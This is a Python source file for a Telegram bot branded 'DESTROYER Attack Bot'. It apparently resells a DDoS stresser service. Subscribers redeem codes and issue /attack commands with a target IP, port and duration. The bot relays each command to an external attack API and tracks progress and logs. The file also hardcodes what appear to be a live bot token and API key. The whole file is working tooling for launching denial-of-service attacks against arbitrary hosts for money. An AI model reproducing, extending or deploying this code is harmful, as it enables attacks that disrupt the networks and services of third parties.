import asyncio
import logging
import random
import string
import re
import time
import requests
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackContext,
    ContextTypes,
    CallbackQueryHandler
)
import os
import sys
import html

# Suppress httpx and telegram logging
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)

# Configure logging - only errors and critical
logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.ERROR
)
logger = logging.getLogger(__name__)

# ================= CONFIGURATION =================
BOT_TOKEN = "8034642539:AAEKyfqriazaz-FrR80RQ0bYab-U-lMFOgo"  # Replace with your bot token
ADMIN_USER_ID = 8169131537
OWNER_USERNAME = "@BOBBY859"

# Your Flask API Configuration
YOUR_API_URL = "https://executives-challenged-glenn-installations.trycloudflare.com/api/v1/attack"
YOUR_API_KEY = "2D6O1HOch_q4_JYzgDFMqQ03IGJjrbDKV1BYIgeIAB4"  # Replace with your master API key

# Attack duration limits
MAX_DURATION = 240
MIN_DURATION = 30

# Cooldown between attacks per user (in seconds)
ATTACK_COOLDOWN = 0

# Track last attack time for cooldown
last_attack_time = {}

# Track active attacks
active_attacks = {}
attack_messages = {}

# In-memory storage
reseller_users = {}
reseller_redeem_codes = {}
reseller_attack_logs = []

# ================= HELPER FUNCTIONS =================
def escape_markdown(text: str) -> str:
    """Escape special characters for MarkdownV2"""
    special_chars = r'_*[]()~`>#+-=|{}.!'
    for char in special_chars:
        text = text.replace(char, f'\\{char}')
    return text

def get_current_time():
    return datetime.now(timezone.utc)

def get_current_timestamp():
    return time.time()

def is_user_expired(user_id: int) -> bool:
    if user_id == ADMIN_USER_ID:
        return False
    user = reseller_users.get(user_id)
    if user:
        expiry = user.get('expiry')
        if expiry and expiry > get_current_timestamp():
            return False
    return True

def get_user_max_duration(user_id: int) -> int:
    if user_id == ADMIN_USER_ID:
        return MAX_DURATION
    user = reseller_users.get(user_id)
    if user:
        return user.get('max_duration', MAX_DURATION)
    return MAX_DURATION

def check_cooldown(user_id: int) -> tuple:
    if user_id == ADMIN_USER_ID:
        return False, 0
    
    if ATTACK_COOLDOWN == 0:
        return False, 0
    
    if user_id in last_attack_time:
        last_time = last_attack_time[user_id]
        current_time = get_current_timestamp()
        elapsed = current_time - last_time
        
        if elapsed < ATTACK_COOLDOWN:
            remaining = int(ATTACK_COOLDOWN - elapsed)
            return True, remaining
    
    return False, 0

def update_last_attack_time(user_id: int):
    if user_id != ADMIN_USER_ID:
        last_attack_time[user_id] = get_current_timestamp()

def get_user_active_attack_count(user_id: int) -> int:
    if user_id not in active_attacks:
        return 0
    
    current_time = get_current_timestamp()
    active_attacks[user_id] = [end_time for end_time in active_attacks[user_id] if end_time > current_time]
    
    if len(active_attacks[user_id]) == 0:
        if user_id in active_attacks:
            del active_attacks[user_id]
        return 0
    
    return len(active_attacks[user_id])

def is_user_has_active_attack(user_id: int) -> bool:
    return get_user_active_attack_count(user_id) > 0

def get_remaining_time(user_id: int) -> int:
    if user_id not in active_attacks:
        return 0
    
    current_time = get_current_timestamp()
    active_attacks[user_id] = [end_time for end_time in active_attacks[user_id] if end_time > current_time]
    
    if not active_attacks[user_id]:
        if user_id in active_attacks:
            del active_attacks[user_id]
        return 0
    
    remaining = min(active_attacks[user_id]) - current_time
    return max(0, int(remaining))

def add_user_attack(user_id: int, end_time: float, chat_id: int, message_id: int):
    if user_id not in active_attacks:
        active_attacks[user_id] = []
    active_attacks[user_id].append(end_time)
    
    if user_id not in attack_messages:
        attack_messages[user_id] = []
    attack_messages[user_id].append({
        'chat_id': chat_id,
        'message_id': message_id,
        'end_time': end_time
    })

def log_attack(user_id: int, ip: str, port: int, duration: int, status: str, response: str = None):
    attack_log = {
        "user_id": user_id,
        "ip": ip,
        "port": port,
        "duration": duration,
        "status": status,
        "response": response[:500] if response else None,
        "timestamp": get_current_time().isoformat()
    }
    reseller_attack_logs.append(attack_log)
    
    while len(reseller_attack_logs) > 1000:
        reseller_attack_logs.pop(0)

def parse_time(time_str: str) -> int:
    time_str = time_str.lower().strip()
    
    if time_str.endswith('h'):
        return int(time_str[:-1]) * 3600
    elif time_str.endswith('m'):
        return int(time_str[:-1]) * 60
    elif time_str.endswith('d'):
        return int(time_str[:-1]) * 86400
    elif time_str.endswith('s'):
        return int(time_str[:-1])
    else:
        return int(time_str) * 86400

def format_time(seconds: int) -> str:
    if seconds >= 86400:
        days = seconds // 86400
        return f"{days}d"
    elif seconds >= 3600:
        hours = seconds // 3600
        return f"{hours}h"
    elif seconds >= 60:
        minutes = seconds // 60
        return f"{minutes}m"
    else:
        return f"{seconds}s"

def generate_redeem_code(length=10):
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def send_attack_to_your_api(ip: str, port: int, duration: int, api_key: str) -> Dict:
    """Send attack request to your Flask API"""
    try:
        response = requests.post(
            YOUR_API_URL,
            json={"ip": ip, "port": port, "duration": duration},
            headers={
                "x-api-key": api_key,
                "Content-Type": "application/json"
            },
            timeout=30
        )
        
        if response.status_code == 200:
            return response.json()
        else:
            return {"success": False, "error": f"API HTTP {response.status_code}"}
            
    except Exception as e:
        return {"success": False, "error": str(e)}

# ================= COMMANDS =================

async def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    try:
        if user_id == ADMIN_USER_ID:
            message = (
                "🔥 Welcome Master Reseller! 🔥\n\n"
                "You are the admin of this bot.\n\n"
                "Commands:\n"
                "/add <user_id> <time> - Add user\n"
                "/remove <user_id> - Remove user\n"
                "/users - List your users\n"
                "/gen <time> [code] - Generate redeem code\n"
                "/redeem <code> - Redeem code\n"
                "/attack <ip> <port> <duration> - Launch attack\n"
                "/myattacks - Check active attacks\n"
                "/logs - View attack logs\n"
                "/stats - Bot statistics\n\n"
                f"Support: {OWNER_USERNAME}"
            )
        else:
            if is_user_expired(user_id):
                message = (
                    "Access Denied!\n\n"
                    "You don't have an active subscription.\n\n"
                    f"Contact {OWNER_USERNAME} to purchase access."
                )
            else:
                expiry_time = reseller_users[user_id].get('expiry', 0)
                remaining_days = int((expiry_time - get_current_timestamp()) / 86400)
                max_duration = get_user_max_duration(user_id)
                
                message = (
                    f"🔥 Welcome to DESTROYER Attack Bot! 🔥\n\n"
                    f"Your subscription is active\n"
                    f"Remaining: {remaining_days} days\n"
                    f"Max Attack Duration: {max_duration}s\n\n"
                    "Commands:\n"
                    "/attack <ip> <port> <duration> - Launch attack\n"
                    "/myattacks - Check active attacks\n"
                    "/redeem <code> - Redeem code\n\n"
                    f"Support: {OWNER_USERNAME}"
                )
        
        await context.bot.send_message(chat_id=chat_id, text=message)
    except Exception as e:
        print(f"Error in start command: {e}")
        await context.bot.send_message(chat_id=chat_id, text="Welcome to  Attack Bot! Use /help for commands.")

async def help_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    try:
        if user_id == ADMIN_USER_ID:
            help_text = (
                "Master Reseller Commands:\n\n"
                "User Management:\n"
                "/add <user_id> <time> - Add user (time: 1d, 2d, 1m, 1y)\n"
                "/remove <user_id> - Remove user\n"
                "/users - List all your users\n\n"
                "Redeem Code Management:\n"
                "/gen <time> [code] - Generate redeem code\n"
                "/redeem <code> - Redeem code\n\n"
                "Attack Commands:\n"
                "/attack <ip> <port> <duration> - Launch attack\n"
                "/myattacks - Check active attacks\n\n"
                "Other:\n"
                "/logs - View attack logs\n"
                "/stats - Bot statistics\n\n"
                f"Support: {OWNER_USERNAME}"
            )
        else:
            if is_user_expired(user_id):
                help_text = f"Your subscription has expired! Contact {OWNER_USERNAME} to renew."
            else:
                help_text = (
                    "User Commands:\n\n"
                    "/attack <ip> <port> <duration> - Launch attack\n"
                    "/myattacks - Check active attacks\n"
                    "/redeem <code> - Redeem code\n\n"
                    f"Support: {OWNER_USERNAME}"
                )
        
        await context.bot.send_message(chat_id=chat_id, text=help_text)
    except Exception as e:
        print(f"Error in help command: {e}")
        await context.bot.send_message(chat_id=chat_id, text="Use /attack <ip> <port> <duration> to launch attacks.")

async def add_user_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="Only bot owner can add users!")
        return
    
    if len(context.args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="Usage: /add <user_id> <time>\n\nExample: /add 123456789 30d")
        return
    
    try:
        target_user_id = int(context.args[0])
        time_str = context.args[1]
        total_seconds = parse_time(time_str)
        formatted_time = format_time(total_seconds)
        
        expiry_timestamp = get_current_timestamp() + total_seconds
        
        reseller_users[target_user_id] = {
            "user_id": target_user_id,
            "expiry": expiry_timestamp,
            "added_at": get_current_timestamp(),
            "added_by": user_id,
            "max_duration": MAX_DURATION
        }
        
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"User {target_user_id} added for {formatted_time}!"
        )
        
        try:
            await context.bot.send_message(
                chat_id=target_user_id,
                text=f"You have been granted access to DESTROYER Attack Bot!\n\nDuration: {formatted_time}\nMax Attack Duration: {MAX_DURATION}s\n\nUse /help to see commands.\n\nSupport: {OWNER_USERNAME}"
            )
        except:
            pass
            
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="Invalid user ID!")
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"Error: {str(e)}")

async def remove_user_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="Only bot owner can remove users!")
        return
    
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="Usage: /remove <user_id>")
        return
    
    try:
        target_user_id = int(context.args[0])
        
        if target_user_id in reseller_users:
            del reseller_users[target_user_id]
            await context.bot.send_message(chat_id=chat_id, text=f"User {target_user_id} removed!")
            
            try:
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text=f"Your access to DESTROYER Attack Bot has been revoked!\n\nContact {OWNER_USERNAME} for more information."
                )
            except:
                pass
        else:
            await context.bot.send_message(chat_id=chat_id, text=f"User {target_user_id} not found!")
            
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="Invalid user ID!")

async def list_users_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="Only bot owner can list users!")
        return
    
    if not reseller_users:
        await context.bot.send_message(chat_id=chat_id, text="No users found!")
        return
    
    message = "Your Users:\n\n"
    for uid, user_data in reseller_users.items():
        expiry = user_data.get('expiry', 0)
        remaining_days = int((expiry - get_current_timestamp()) / 86400)
        status = "Active" if remaining_days > 0 else "Expired"
        message += f"ID: {uid} - {remaining_days}d left ({status})\n"
    
    await context.bot.send_message(chat_id=chat_id, text=message)

async def generate_code_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="Only bot owner can generate codes!")
        return
    
    if len(context.args) < 1:
        await context.bot.send_message(chat_id=chat_id, text="Usage: /gen <time> [code]\n\nExample: /gen 30d\n/gen 7d MYCODE123")
        return
    
    try:
        time_str = context.args[0]
        total_seconds = parse_time(time_str)
        formatted_time = format_time(total_seconds)
        
        code = context.args[1].upper() if len(context.args) > 1 else generate_redeem_code()
        
        reseller_redeem_codes[code] = {
            "code": code,
            "expiry_seconds": total_seconds,
            "formatted_time": formatted_time,
            "created_at": get_current_timestamp(),
            "created_by": user_id,
            "max_uses": 1,
            "used_by": [],
            "used_count": 0
        }
        
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"Code Generated!\n\nCode: {code}\nValid: {formatted_time}\n\nShare this code with your users to redeem access."
        )
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"Error: {str(e)}")

async def redeem_code_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    username = update.effective_user.username or update.effective_user.first_name
    
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="Usage: /redeem <code>")
        return
    
    code = context.args[0].upper()
    
    if code not in reseller_redeem_codes:
        await context.bot.send_message(chat_id=chat_id, text="Invalid code!")
        return
    
    code_data = reseller_redeem_codes[code]
    
    if code_data.get('used_count', 0) >= code_data.get('max_uses', 1):
        await context.bot.send_message(chat_id=chat_id, text="Code already used!")
        return
    
    if user_id in reseller_users:
        current_expiry = reseller_users[user_id].get('expiry', 0)
        new_expiry = max(current_expiry, get_current_timestamp()) + code_data['expiry_seconds']
    else:
        new_expiry = get_current_timestamp() + code_data['expiry_seconds']
    
    reseller_users[user_id] = {
        "user_id": user_id,
        "username": username,
        "expiry": new_expiry,
        "redeemed_at": get_current_timestamp(),
        "redeemed_code": code,
        "added_by": code_data.get('created_by', ADMIN_USER_ID),
        "max_duration": MAX_DURATION
    }
    
    code_data['used_count'] += 1
    code_data['used_by'].append({
        "user_id": user_id,
        "username": username,
        "redeemed_at": get_current_timestamp()
    })
    
    remaining_days = int((new_expiry - get_current_timestamp()) / 86400)
    
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"Code Redeemed Successfully!\n\nYou now have access to DESTROYER Attack Bot!\nDuration: {code_data['formatted_time']}\nRemaining: {remaining_days} days\nMax Attack Duration: {MAX_DURATION}s\n\nUse /help to see commands."
    )
    
    await context.bot.send_message(
        chat_id=ADMIN_USER_ID,
        text=f"Code Redeemed!\n\nUser: {username} ({user_id})\nCode: {code}\nDuration: {code_data['formatted_time']}"
    )

async def attack_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    username = update.effective_user.username or update.effective_user.first_name
    
    if user_id != ADMIN_USER_ID and is_user_expired(user_id):
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"Your subscription has expired!\n\nContact {OWNER_USERNAME} to renew."
        )
        return
    
    is_on_cooldown, remaining_cooldown = check_cooldown(user_id)
    if is_on_cooldown:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"Cooldown! Wait {remaining_cooldown}s before next attack."
        )
        return
    
    if is_user_has_active_attack(user_id):
        remaining = get_remaining_time(user_id)
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"You already have an active attack!\nWait {remaining}s for it to finish."
        )
        return
    
    if len(context.args) != 3:
        max_duration = get_user_max_duration(user_id)
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"Usage: /attack <ip> <port> <duration>\n\nExample: /attack 1.1.1.1 80 60\nMax duration: {max_duration}s"
        )
        return
    
    ip = context.args[0]
    port_str = context.args[1]
    duration_str = context.args[2]
    
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if not ip_pattern.match(ip):
        await context.bot.send_message(chat_id=chat_id, text="Invalid IP address!")
        return
    
    try:
        port = int(port_str)
        if port < 1 or port > 65535:
            await context.bot.send_message(chat_id=chat_id, text="Port must be between 1 and 65535!")
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="Invalid port!")
        return
    
    try:
        duration = int(duration_str)
        max_duration = get_user_max_duration(user_id)
        if duration < MIN_DURATION:
            await context.bot.send_message(chat_id=chat_id, text=f"Duration must be at least {MIN_DURATION} second!")
            return
        if duration > max_duration:
            await context.bot.send_message(chat_id=chat_id, text=f"Duration cannot exceed {max_duration} seconds for your plan!")
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="Invalid duration!")
        return
    
    status_msg = await context.bot.send_message(
        chat_id=chat_id,
        text=f"Launching Attack...\n\nTarget: {ip}:{port}\nDuration: {duration}s\nContacting DESTROYER STRESSER ..."
    )
    
    result = send_attack_to_your_api(ip, port, duration, YOUR_API_KEY)
    
    if result.get("success"):
        update_last_attack_time(user_id)
        end_time = get_current_timestamp() + duration
        add_user_attack(user_id, end_time, chat_id, status_msg.message_id)
        log_attack(user_id, ip, port, duration, "success", "Attack sent successfully")
        
        await status_msg.edit_text(
            text=f"DESTROYER API ATTACK LAUNCHED!\n\nTarget: {ip}:{port}\nDuration: {duration}s\nAttack in progress..."
        )
        
        asyncio.create_task(attack_progress_message(context, chat_id, user_id, ip, port, duration, status_msg.message_id))
    else:
        error_msg = result.get("error", result.get("message", "Unknown error"))
        await status_msg.edit_text(
            text=f"ATTACK FAILED!\n\nTarget: {ip}:{port}\nError: {error_msg}\n\nContact {OWNER_USERNAME} for support"
        )
        log_attack(user_id, ip, port, duration, "failed", str(result))

async def attack_progress_message(context: CallbackContext, chat_id: int, user_id: int, ip: str, port: int, duration: int, message_id: int):
    start_time = get_current_timestamp()
    update_intervals = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100]
    
    for target_percent in update_intervals:
        if user_id not in active_attacks:
            break
            
        target_time = start_time + (duration * target_percent / 100)
        current_time = get_current_timestamp()
        
        if target_time > current_time:
            await asyncio.sleep(target_time - current_time)
        
        if user_id not in active_attacks:
            break
            
        elapsed = get_current_timestamp() - start_time
        percent = min(100, int((elapsed / duration) * 100))
        progress_bar = "█" * (percent // 10) + "░" * (10 - (percent // 10))
        remaining = max(0, int(duration - elapsed))
        
        text = (
            f"DESTROYER API ATTACK IN PROGRESS\n\n"
            f"Target: {ip}:{port}\n"
            f"Duration: {duration}s\n"
            f"Progress: [{progress_bar}] {percent}%\n"
            f"Time Left: {remaining}s\n\n"
            f"Attack is running... Please wait!"
        )
        
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=text
            )
        except:
            pass
    
    if user_id in active_attacks:
        final_text = (
            f"DESTROYER API Attack Completed!\n\n"
            f"Target: {ip}:{port}\n"
            f"Duration: {duration}s\n\n"
            f"Contact for support: {OWNER_USERNAME}"
        )
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=final_text
            )
        except:
            pass
    
    if user_id in active_attacks:
        current_time = get_current_timestamp()
        active_attacks[user_id] = [et for et in active_attacks[user_id] if et > current_time]
        if not active_attacks[user_id]:
            del active_attacks[user_id]

async def myattacks_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    active_count = get_user_active_attack_count(user_id)
    
    if active_count > 0:
        remaining = get_remaining_time(user_id)
        message = f"Active Attacks: {active_count}\nTime remaining: {remaining}s"
    else:
        recent = [log for log in reseller_attack_logs if log.get('user_id') == user_id][-5:]
        if recent:
            message = "Recent Attacks:\n"
            for a in recent:
                status_icon = "YES" if a.get('status') == "success" else "NO"
                message += f"{status_icon} {a['ip']}:{a['port']} - {a['duration']}s\n"
        else:
            message = "No attacks found"
    
    await context.bot.send_message(chat_id=chat_id, text=message)

async def logs_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="Only bot owner can view logs!")
        return
    
    if not reseller_attack_logs:
        await context.bot.send_message(chat_id=chat_id, text="No attack logs found!")
        return
    
    recent_logs = reseller_attack_logs[-20:]
    
    message = "Attack Logs (Last 20):\n\n"
    for log in recent_logs:
        status_icon = "YES" if log.get('status') == "success" else "NO"
        timestamp = log.get('timestamp', '')[:16]
        message += f"{status_icon} User {log['user_id']} -> {log['ip']}:{log['port']} - {log['duration']}s [{timestamp}]\n"
    
    await context.bot.send_message(chat_id=chat_id, text=message)

async def stats_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="Only bot owner can view stats!")
        return
    
    total_users = len(reseller_users)
    active_users = 0
    for uid, user_data in reseller_users.items():
        if user_data.get('expiry', 0) > get_current_timestamp():
            active_users += 1
    
    total_codes = len(reseller_redeem_codes)
    used_codes = sum(1 for code in reseller_redeem_codes.values() if code.get('used_count', 0) > 0)
    total_attacks = len(reseller_attack_logs)
    successful_attacks = sum(1 for log in reseller_attack_logs if log.get('status') == "success")
    active_attacks_count = sum(len(v) for v in active_attacks.values())
    
    message = (
        f"Bot Statistics:\n\n"
        f"Total Users: {total_users}\n"
        f"Active Users: {active_users}\n"
        f"Total Codes: {total_codes}\n"
        f"Used Codes: {used_codes}\n"
        f"Total Attacks: {total_attacks}\n"
        f"Successful Attacks: {successful_attacks}\n"
        f"Active Attacks: {active_attacks_count}\n"
        f"Max Duration: {MAX_DURATION}s\n\n"
        f"Support: {OWNER_USERNAME}"
    )
    
    await context.bot.send_message(chat_id=chat_id, text=message)

# ================= MAIN FUNCTION =================
def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("myattacks", myattacks_command))
    application.add_handler(CommandHandler("redeem", redeem_code_command))
    application.add_handler(CommandHandler("add", add_user_command))
    application.add_handler(CommandHandler("remove", remove_user_command))
    application.add_handler(CommandHandler("users", list_users_command))
    application.add_handler(CommandHandler("gen", generate_code_command))
    application.add_handler(CommandHandler("logs", logs_command))
    application.add_handler(CommandHandler("stats", stats_command))
    
    print("\n" + "="*60)
    print("🔥 RESELLER BOT STARTED SUCCESSFULLY 🔥")
    print("="*60)
    print(f"Admin ID: {ADMIN_USER_ID} ({OWNER_USERNAME})")
    print(f"API URL: {YOUR_API_URL}")
    print(f"Max Attack Duration: {MAX_DURATION}s")
    print("="*60)
    print("Bot is ready to launch attacks via your API!")
    print("="*60 + "\n")
    
    application.run_polling()

if __name__ == '__main__':
    main()
